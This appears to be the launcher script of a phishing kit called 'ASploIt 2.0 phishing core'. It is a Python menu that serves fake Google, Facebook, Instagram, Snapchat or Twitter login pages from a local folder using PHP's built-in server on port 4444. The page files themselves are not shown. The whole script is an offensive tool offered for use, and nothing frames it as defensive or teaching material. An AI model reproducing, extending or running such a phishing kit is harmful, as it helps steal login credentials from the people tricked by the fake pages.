###########################################
##ASploIt 2.0 phishing core          ######
###########################################

import os
import subprocess

os.system("clear");
os.system("toilet -f mono12 a-phish");

print("1.Google Phishing Page ");
print("2.Facebook Phishing Page");
print("3.Instagram Phishing Page");
print("4.Snapchat Phishing Page");
print("5.Twitter Phishing Page");
print("6.Exit");


choice = int(input("ENTER CHOICE :"));

if choice ==1:
 os.system("cd sites && php -S 127.0.0.1:4444 -t google");

if choice ==2:
 os.system("cd sites && php -S 127.0.0.1:4444 -t facebook");

if choice ==3:
 os.system("cd sites && php -S 127.0.0.1:4444 -t instagram");

if choice ==4:
 os.system("cd sites && php -S 127.0.0.1:4444 -t snapchat");

if choice ==5:
 os.system("cd sites && php -S 127.0.0.1:4444 -t twitter");

if choice ==6:
 exit();
